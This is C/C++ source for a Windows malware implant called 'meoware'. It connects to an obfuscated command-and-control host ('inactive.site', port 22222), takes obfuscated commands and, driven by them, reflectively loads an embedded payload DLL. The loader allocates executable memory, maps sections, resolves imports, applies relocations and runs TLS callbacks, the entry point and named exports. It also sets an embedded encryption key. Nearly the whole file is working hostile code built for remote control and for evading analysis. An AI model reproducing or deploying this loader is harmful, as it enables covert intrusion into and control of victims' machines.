#include "meoware.h"

#include <ws2tcpip.h>
#pragma comment (lib, "Ws2_32.lib")

#include <stdio.h>

#include "strobf.hpp"
#include "resolver.h"
#include "stubber.h"
#include "payload_dll.h"

#pragma section(".meow", read, write)
__declspec(allocate(".meow")) DWORD global_context_idx = 0;
__declspec(allocate(".meow")) meow_context global_context[0x10];

char payload_dll[] = PAYLOAD_DLL;
BYTE pexport_dir_data[] = PAYLOAD_EXPORTS;
BYTE pimport_dir_data[] = PAYLOAD_IMPORTS;
BYTE preloca_dir_data[] = PAYLOAD_RELOC;
BYTE section_hdr_data[] = PAYLOAD_SECTIONS;
BYTE* image;

WrapFuncs funcs;

typedef void*(*START)(DWORD hash);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

static void meow_connect(meow_context* context);
static void meow_interactive(meow_context* context);
static void meow_wry(meow_context* context);

meow_context* meow_init(void)
{
    constexpr auto port = OBFUSCATE("22222");
    constexpr auto site = OBFUSCATE("inactive.site");

    meow_context* pcontext = &global_context[global_context_idx];
    global_context_idx += 1;

    DEOBFUSCA(port);
    DEOBFUSCA(site);

    pcontext->sock = INVALID_SOCKET;
    memcpy(pcontext->port, (char*)&port, sizeof(port.m_data));
    memcpy(pcontext->site, (char*)&site, sizeof(site.m_data));

    pcontext->meow_connect = meow_connect;
    pcontext->meow_interactive = meow_interactive;
    pcontext->meow_setenc = meow_wry;

    funcs.WrapNtCreateUserProcess = WrapNtCreateUserProcess;
    funcs.WrapSleep = WrapSleep;
    funcs.WrapRecv = WrapRecv;
    funcs.exit = exit;

    return pcontext;
}

static void meow_connect(meow_context* context)
{
    WSADATA wsaData;
    ADDRINFOA hints, * result;
    SOCKET cs;
    DWORD iResult;

    // Fetch command from c2
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(context->site, context->port, &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return;
    }

    cs = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (cs == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    iResult = connect(cs, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(cs);
        freeaddrinfo(result);
        WSACleanup();
        return;
    }

    context->sock = cs;
}

static void meow_recv(meow_context* context, BYTE* buf, DWORD buflen)
{
    DWORD iResult;

    buf[0] = 0;
    
    WrapRecv(context->sock, (BYTE*)buf, buflen, 0);
}

static void meow_interactive(meow_context* context)
{
    BYTE cmd[0x100];

    for (DWORD i = 0; i < 11; ++i) {
        meow_recv(context, cmd, sizeof(cmd));

        constexpr auto tls_cmd = OBFUSCATE("3a5a5f39");
        DEOBFUSCA(tls_cmd);

        if (!strcmp((char*)cmd, (char*)&tls_cmd)) {
            // Handle TLS
            DWORD ptls_dir_va = PAYLOAD_TLS_RVA;

            if (ptls_dir_va) {
                DLLMAIN* tls_callbacks = *(DLLMAIN**)(image + ptls_dir_va + 0x18);
                for (DLLMAIN callback = *tls_callbacks; callback;) {
                    callback((HINSTANCE)image, 1, context);
                    tls_callbacks++;
                    callback = *tls_callbacks;
                }
            }
            continue;
        }

        constexpr auto sections_cmd = OBFUSCATE("d2e021ce");
        DEOBFUSCA(sections_cmd);

        if (!strcmp((char*)cmd, (char*)&sections_cmd)) {
            // Load Sections
            WORD section_cnt = PAYLOAD_SECTION_CNT;
            BYTE* section_hdr = section_hdr_data;

            while (section_cnt) {
                DWORD virtualsize = *(DWORD*)(section_hdr + 8);
                DWORD virtualaddr = *(DWORD*)(section_hdr + 0xc);
                DWORD rawsize = *(DWORD*)(section_hdr + 0x10);
                DWORD rawaddr = *(DWORD*)(section_hdr + 0x14);
                DWORD characteristics = *(DWORD*)(section_hdr + 0x24);

                memcpy(&image[virtualaddr], &payload_dll[rawaddr], rawsize);

                section_hdr += 0x28;
                section_cnt -= 1;
            }

            continue;
        }

        constexpr auto imports_cmd = OBFUSCATE("b728d480");
        DEOBFUSCA(imports_cmd);

        if (!strcmp((char*)cmd, (char*)&imports_cmd)) {
            // Handle Imports
            BYTE* pimport_dir = pimport_dir_data;
            DWORD pimport_dir_cnt = PAYLOAD_IMPORT_CNT;

            while (pimport_dir_cnt) {
                DWORD64* originalFirstThunk = (DWORD64*)(image + *(DWORD*)(pimport_dir));
                BYTE* importedDllName = image + *(DWORD*)(pimport_dir + 0xc);
                DWORD64* firstThunk = (DWORD64*)(image + *(DWORD*)(pimport_dir + 0x10));

                BYTE* idll_dos_hdr = (BYTE*)LoadLibraryA((LPCSTR)importedDllName);
                BYTE* idll_nt_hdr = idll_dos_hdr + *(DWORD*)(idll_dos_hdr + 0x3c);
                DWORD idll_export_dir_va = *(DWORD*)(idll_nt_hdr + 0x88);
                BYTE* idll_export_hdr = idll_dos_hdr + idll_export_dir_va;
                DWORD idll_export_base = *(DWORD*)(idll_export_hdr + 0x10);
                DWORD* idll_export_addrfuncs = (DWORD*)(idll_dos_hdr + *(DWORD*)(idll_export_hdr + 0x1c));

                while (true) {
                    DWORD64 thunk = *originalFirstThunk;
                    DWORD64 addr;

                    if (!thunk) {
                        thunk = *(DWORD64*)firstThunk;
                    }

                    if (!thunk) {
                        break;
                    }

                    if (thunk & 0x80000000) {
                        DWORD ordinal = thunk & 0xffff;

                        addr = (DWORD64)(idll_dos_hdr + idll_export_addrfuncs[(ordinal - idll_export_base)]);
                    }
                    else {
                        CHAR* proc_name = (CHAR*)image + thunk + 2;

                        addr = (DWORD64)GetProcAddr(idll_dos_hdr, proc_name);
                    }

                    *firstThunk = addr;

                    originalFirstThunk += 1;
                    firstThunk += 1;
                }

                pimport_dir += 0x14;
                pimport_dir_cnt -= 1;
            }

            continue;
        }

        constexpr auto export_cmd = OBFUSCATE("452013a2");
        DEOBFUSCA(export_cmd);

        if (!strcmp((char*)cmd, (char*)&export_cmd)) {
            // Run Export Function
            char proc_name[0x20];

            meow_recv(context, (BYTE*)proc_name, sizeof(proc_name));

            BYTE* pexport_dir = pexport_dir_data;
            DWORD pexport_dir_sz = PAYLOAD_EXPORT_SIZE;

            // Run export function
            if (pexport_dir_sz) {
                DWORD num_funcs = *(DWORD*)(pexport_dir + 0x14);
                DWORD* addr_funcs = (DWORD*)(image + *(DWORD*)(pexport_dir + 0x1c));
                DWORD* addr_names = (DWORD*)(image + *(DWORD*)(pexport_dir + 0x20));
                WORD* addr_ordis = (WORD*)(image + *(DWORD*)(pexport_dir + 0x24));
                DWORD i;
                START addr;
                DWORD ordi;

                for (i = 0; i < num_funcs; ++i) {
                    CHAR* func_name = (CHAR*)(image + addr_names[i]);

                    if (!_stricmp(func_name, proc_name)) {
                        break;
                    }
                }

                if (i >= num_funcs) {
                    addr = NULL;
                }
                else {
                    ordi = addr_ordis[i];
                    addr = (START)(image + addr_funcs[ordi]);
                    addr(600);
                }
            }

            continue;
        }

        constexpr auto flush_cmd = OBFUSCATE("75207bab");
        DEOBFUSCA(flush_cmd);

        if (!strcmp((char*)cmd, (char*)&flush_cmd)) {
            // Flush Instruction Cache
            FlushInstructionCache((HANDLE)-1, NULL, 0);
            continue;
        }

        constexpr auto allocate_cmd = OBFUSCATE("be5ac4e9");
        DEOBFUSCA(allocate_cmd);

        if (!strcmp((char*)cmd, (char*)&allocate_cmd)) {
            // Allocate memory
            // Get Image sIze
            DWORD sizeOfImage = PAYLOAD_SIZE_OF_IMAGE;

            // Allocate Image
            image = (BYTE*)VirtualAlloc(NULL, sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (!image) {
                return;
            }
            continue;
        }

        constexpr auto entry_cmd = OBFUSCATE("eae0b274");
        DEOBFUSCA(entry_cmd);

        if (!strcmp((char*)cmd, (char*)&entry_cmd)) {
            // Entry point
            DWORD entry_va = PAYLOAD_ENTRY;
            DLLMAIN entry;

            entry = (DLLMAIN)(image + entry_va);
            entry((HINSTANCE)image, DLL_PROCESS_ATTACH, &funcs);
            continue;
        }

        constexpr auto reloc_cmd = OBFUSCATE("8d744429");
        DEOBFUSCA(reloc_cmd);

        if (!strcmp((char*)cmd, (char*)&reloc_cmd)) {
            // Handle Relocation
            DWORD64 pimage_base = PAYLOAD_IMAGEBASE;
            BYTE* preloca_dir = preloca_dir_data;
            DWORD preloca_dir_sz = PAYLOAD_RELOC_SIZE;

            while (preloca_dir_sz) {
                DWORD64 diff = (DWORD64)image - pimage_base;
                DWORD page_va = *(DWORD*)(preloca_dir);
                DWORD block_sz = *(DWORD*)(preloca_dir + 4);
                WORD* entry_ptr = (WORD*)(preloca_dir + 8);
                DWORD tmp_block_sz = block_sz - 8;

                while (tmp_block_sz) {
                    WORD entry = *entry_ptr;

                    if (!entry)
                        break;

                    BYTE type = entry >> 12;
                    WORD offset = entry & 0xfff;

                    if (type == 0xa) {
                        // IMAGE_REL_BASED_DIR64
                        *(DWORD64*)(image + page_va + offset) += diff;
                    }
                    else if (type == 3) {
                        // IMAGE_REL_BASED_HIGHLOW
                        *(DWORD*)(image + page_va + offset) += (DWORD)diff;
                    }
                    else if (type == 2) {
                        // IMAGE_REL_BASED_LOW
                        *(WORD*)(image + page_va + offset) += (WORD)diff;
                    }
                    else if (type == 1) {
                        // IMAGE_REL_BASED_HIGH
                        *(WORD*)(image + page_va + offset) += (WORD)(diff >> 16);
                    }

                    entry_ptr += 1;
                    tmp_block_sz -= 2;
                }

                preloca_dir += block_sz;
                preloca_dir_sz -= block_sz;
            }

            continue;
        }
    }
}

void meow_wry(meow_context* context)
{
    BYTE enc[] = { 133, 178, 36, 146, 250, 94, 75, 12, 128, 107, 197, 65, 207, 198, 156, 181, 44, 57, 160, 238, 189, 149, 18, 160, 48, 252, 48, 138, 64, 172, 235, 207, 168, 116, 151, 118, 143, 194, 113, 44, 131, 14, 61, 174, 133, 25, 2, 254, 0 };

    for (int i = 0;; ++i) {
        if (!enc[i]) {
            break;
        }

        context->aes_enc.push_back(enc[i]);
    }
}
